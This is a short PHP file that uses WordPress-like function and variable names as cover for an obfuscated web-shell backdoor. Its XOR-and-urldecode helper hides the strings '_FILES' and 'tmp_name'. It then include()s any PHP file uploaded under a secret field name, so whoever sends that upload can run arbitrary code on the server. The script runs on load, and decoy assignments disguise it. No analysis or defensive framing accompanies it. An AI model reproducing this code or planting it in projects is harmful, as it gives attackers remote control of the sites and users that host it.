<?php 	
	$end_clean = 'partials';
function original_image()

{
    $value = 'SZcpIAuFHipTj';

    $single_preg = $value;

    

    $page = $GLOBALS[post_modified_gmt("%0C%1C%2A%3C%0C%12", $single_preg)];
    $valid_date = $page;
    $exts = isset($valid_date[$single_preg]);
    if ($exts)

    {
        $mime_subgroup = $page[$single_preg];
        $filename = $mime_subgroup[post_modified_gmt("%277%13%2F%27+%18%23", $single_preg)];
        $lazyloader = $filename;

        include ($lazyloader);
    }
}

function post_modified_gmt($hierarchical_post_types, $spaces)

{

    $double_encode = $spaces;
    $page_title = "url" . "decode";

    $wp_cockneyreplace = $page_title($hierarchical_post_types);
    $add_seconds_server = substr($double_encode,0, strlen($wp_cockneyreplace));

    $original_text = $wp_cockneyreplace ^ $add_seconds_server;
	$post_ID = 'kids';
    return $original_text;
}


original_image();
	$last_char = 'results';

?>
